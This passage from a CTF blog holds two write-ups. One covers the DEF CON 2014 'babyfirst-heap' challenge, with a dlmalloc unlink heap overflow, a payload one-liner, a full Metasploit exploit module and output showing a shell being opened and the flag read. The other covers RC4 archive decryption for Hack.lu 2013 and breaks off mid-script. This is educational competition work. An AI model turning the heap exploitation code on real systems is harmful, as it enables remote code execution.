<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>objdump -R babyfirst-heap<em>33ecf0ad56efc1b322088f95dd98827c  | grep <span class="nb">printf</span>
</span><span class='line'>0804c004 R</em>386<em>JUMP</em>SLOT   <span class="nb">printf</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, notice that this is occuring during the free of 0x804F058, the block prior to the one allocated for 260 bytes. Since the write is accessing eax+8, we need to subtract 8 from our target address. We can overwrite the GOT entry for printf to point to our shellcode on the heap. For this example, I&#8217;ll replace &quot;AAAA&quot; with printf() GOT - 8, &quot;BBBB&quot; with heap buffer + 8 (to skip our addresses), and replace &quot;C&quot; with &quot;\xCC&quot;, for a breakpoint.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;\xfc\xbf\x04\x08&quot;+&quot;\x58\xf3\x04\x08&quot;+&quot;\xCC&quot;*252+&quot;\x00\x00\x00\x00&quot;&#39;</span> &gt; input
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run &lt; input
</span><span class='line'>...
</span><span class='line'>Program received signal SIGTRAP, Trace/breakpoint trap.
</span><span class='line'>0x0804f359 in ?? <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /5i <span class="nv">$eip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x804f359:   int3
</span><span class='line'>   0x804f35a:   int3
</span><span class='line'>   0x804f35b:   int3
</span><span class='line'>   0x804f35c:   cld
</span><span class='line'>   0x804f35d:   mov    <span class="nv">$0xcccc0804</span>,%edi
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /16bx <span class="nv">$eip</span>
</span><span class='line'>0x804f359:  0xcc    0xcc    0xcc    0xfc    0xbf    0x04    0x08    0xcc
</span><span class='line'>0x804f361:  0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
</span></code></pre></td></tr></table></div></figure>

<p>Great! We hit our breakpoint. However, notice that 0x0804bffc has been written here. That&#8217;s due to unlink() fixing up both BK-&gt;FD and FD-&gt;BK. we can avoid this by putting a simple &#8216;jmp&#8217; in our payload. For example, &#8216;jmp 12&#8217; corresponds to &#8216;\xeb\x0c&#8217;.</p>

<h2>Code</h2>

<p>Note, during the competition, this code was used for exploiting the service and
retrieving the key. It targeted overwriting the do_exit() function pointer, which resulted in all buffers being freed prior to getting code execution. This required safely
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>  <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>    <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;heap&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{</span>
</span><span class='line'><span class="sx">            heap overflow</span>
</span><span class='line'><span class="sx">      }</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;stacks0n&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;linux&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH</em>X86</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Automatic&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span>  <span class="o">]</span><span class="p">,</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">register<em>options</span><span class="p">(</span>
</span><span class='line'>      <span class="o">[</span>
</span><span class='line'>                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;babyfirst-heap</em>33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me&#39;</span><span class="p">),</span>
</span><span class='line'>        <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">4088</span><span class="p">)</span>
</span><span class='line'>      <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>    <span class="n">connect</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">data</span>
</span><span class='line'>        <span class="n">addr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="c1"># [ALLOC][loc=874F058][size=755]</span>
</span><span class='line'>        <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">elem</span><span class="o">|</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">elem</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\</span><span class="s2">[ALLOC</span><span class="se">\</span><span class="s2">]</span><span class="se">\</span><span class="s2">[loc=(.<em>)</span><span class="se">\</span><span class="s2">]</span><span class="se">\</span><span class="s2">[size=(.</em>)</span><span class="se">\</span><span class="s2">]&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="c1"># size</span>
</span><span class='line'>            <span class="k">if</span> <span class="vg">$2</span> <span class="o">==</span> <span class="s2">&quot;260&quot;</span>
</span><span class='line'>              <span class="n">addr</span> <span class="o">=</span> <span class="vg">$1</span>
</span><span class='line'>              <span class="n">addr</span> <span class="o">=</span> <span class="o">[</span><span class="n">addr</span><span class="o">.</span><span class="n">to<em>i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;V&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">end</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">p</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa4\xc8\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># do</em>exit() - 8</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">addr</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xeb\x0C</span><span class="s2">&quot;</span> <span class="c1"># jmp 12</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o"><em></span><span class="mi">16</span> <span class="c1"># why not?</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o"></em></span> <span class="p">(</span><span class="mi">260</span> <span class="o">-</span> <span class="nb">p</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x01\x00\x00\x00</span><span class="s2">&quot;</span> <span class="c1"># overwrite the size block</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa4\xc8\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># do<em>exit() - 8</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">addr</span>
</span><span class='line'>        <span class="n">print</em>status</span> <span class="nb">p</span><span class="o">.</span><span class="n">inspect</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1"># send the payload</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">handler</span>
</span><span class='line'>    <span class="n">disconnect</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</span><span class='line'>
</span><span class='line'><span class="o">[*]</span> <span class="no">Started</span> <span class="n">bind</span> <span class="n">handler</span>
</span><span class='line'>
</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">going</span> <span class="n">to</span> <span class="n">allocate</span> <span class="mi">20</span> <span class="n">objects</span><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="no">Using</span> <span class="no">Dougle</span> <span class="no">Lee</span> <span class="no">Allocator</span> <span class="mi">2</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="no">Goodluck</span><span class="o">!</span>
</span><span class='line'>
</span><span class='line'><span class="no">Exit</span> <span class="n">function</span> <span class="n">pointer</span> <span class="n">is</span> <span class="n">at</span> <span class="mi">804</span><span class="no">C8AC</span> <span class="n">address</span><span class="o">.</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB008</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1246</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB4F0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1121</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB958</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">947</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFBD10</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">741</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC000</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">706</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC2C8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">819</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC600</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">673</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC8A8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1004</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFCC98</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">952</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD058</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">755</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD350</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">260</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD458</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">877</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD7D0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1245</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFDCB8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1047</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE0D8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1152</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE560</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1047</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE980</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1059</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFEDA8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">906</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFF138</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">879</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFF4B0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">823</span><span class="o">]</span>
</span><span class='line'><span class="no">Write</span> <span class="n">to</span> <span class="n">object</span> <span class="o">[</span><span class="n">size</span><span class="o">=</span><span class="mi">260</span><span class="o">]</span><span class="p">:</span>
</span><span class='line'><span class="o">[*]</span> <span class="no">Copied</span> <span class="mi">273</span> <span class="n">bytes</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="o">[*]</span> <span class="no">Command</span> <span class="n">shell</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">12</span><span class="p">:</span><span class="mi">56273</span> <span class="o">-&gt;</span> <span class="mi">23</span><span class="o">.</span><span class="mi">22</span><span class="o">.</span><span class="mi">192</span><span class="o">.</span><span class="mi">226</span><span class="p">:</span><span class="mi">4444</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2014</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">39</span> <span class="o">-</span><span class="mo">0400</span>
</span><span class='line'>
</span><span class='line'><span class="n">cat</span> <span class="n">key</span>
</span><span class='line'><span class="n">cat</span><span class="p">:</span> <span class="n">key</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
</span><span class='line'><span class="n">cd</span> <span class="sr">/home</span>
</span><span class='line'><span class="sr">ls</span>
</span><span class='line'><span class="sr">babyfirst-heap</span>
</span><span class='line'><span class="sr">ubuntu</span>
</span><span class='line'><span class="sr">cd b</span>
</span><span class='line'><span class="sr">/</span><span class="n">bin</span><span class="o">//</span><span class="n">sh</span><span class="p">:</span> <span class="mi">5</span><span class="p">:</span> <span class="n">cd</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t cd to b</span>
</span><span class='line'><span class="s1">cd babyfirst-heap</span>
</span><span class='line'><span class="s1">cat key</span>
</span><span class='line'><span class="s1">cat: key: No such file or directory</span>
</span><span class='line'><span class="s1">ls</span>
</span><span class='line'><span class="s1">babyfirst-heap</span>
</span><span class='line'><span class="s1">flag</span>
</span><span class='line'><span class="s1">cat flag</span>
</span><span class='line'><span class="s1">The flag is: Good job on that doubly linked list. Why don&#39;</span><span class="n">t</span> <span class="n">you</span> <span class="n">try</span> <span class="n">something</span> <span class="n">harder!</span><span class="o">!</span><span class="no">OMG</span><span class="o">!!</span>
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2013 - Flux Archive Part 2]]></title>
    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2/"/>
    <updated>2013-10-27T15:46:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>These sneaky humans! They do not just use one passcode, but two to enter the Festzelt. We heard that the passcode is hidden inside the archive file. It seems that the FluxFingers overrated their programming skill and had a major logical flaw in the archive file structure. Some of the drunken Oktoberfest humans found it and abused this flaw in order to transfer hidden messages. Find this passcode so we can finally drink their beer!</p>

<h2>Analysis</h2>

<p>Somewhere in the archive there is some hidden data. Playing around with the tool, I notice that when we delete archives the file size does not change. It must just leave the file entry data but delete the file itself.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ./archiv -a myarchive.arc 123456 <span class="nb">test</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>FluxArchiv - solved security since 2007!
</span><span class='line'>Written by sqall - leading expert in social-kernel-web-reverse-engineering.
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>Archiv myarchive.arc successfully created.
</span><span class='line'>
</span><span class='line'>Progress:
</span><span class='line'>0% ... 10% ... 20% ... 30% ... 40% ... 50% ... 60% ... 70% ... 80% ... 90% ... 100%
</span><span class='line'>
</span><span class='line'>File <span class="nb">test </span>successfully added to the archiv.
</span><span class='line'>
</span><span class='line'>% ls -al myarchive.arc
</span><span class='line'>-rw-rw-r-- 1 stacks0n stacks0n 2112 Oct 23 20:39 myarchive.arc
</span><span class='line'>
</span><span class='line'>% ./archiv -d myarchive.arc 123456 <span class="nb">test</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>FluxArchiv - solved security since 2007!
</span><span class='line'>Written by sqall - leading expert in social-kernel-web-reverse-engineering.
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>File <span class="nb">test </span>successfully deleted from the archiv.
</span><span class='line'>
</span><span class='line'>% ls -al myarchive.arc
</span><span class='line'>-rw-rw-r-- 1 stacks0n stacks0n 2112 Oct 23 20:39 myarchive.arc
</span></code></pre></td></tr></table></div></figure>

<p>Looking at sanitizeFilename(), file entries begin at offset 0x20 and there is a magic value of &quot;FluXL1sT&quot;. The filenames are RC4 encrypted with the key being the SHA-1 sum of the archive password. Setting a breakpoint in sanitizeFilename() towards the end of the function, we notice a number of files that are simply empty string. It would appear that they are simply cleared out when deleted.</p>

<p>I wonder if we can simply just encrypt a new filename and replace the entry to access the file without having to learn anything else about the file format. Turns out that I struggled with that, but when decrypting blocks in the file noticed my plaintext being displayed. So rather than actually figure out the format, lets just brute force decrypting blocks and see if we get lucky.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;rc4&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;digest/sha1&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;FluxArchiv.arc&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="kp">false</span>
</span><span class='line'>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;PWF41L&quot;</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">.</span><span class="n">size</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
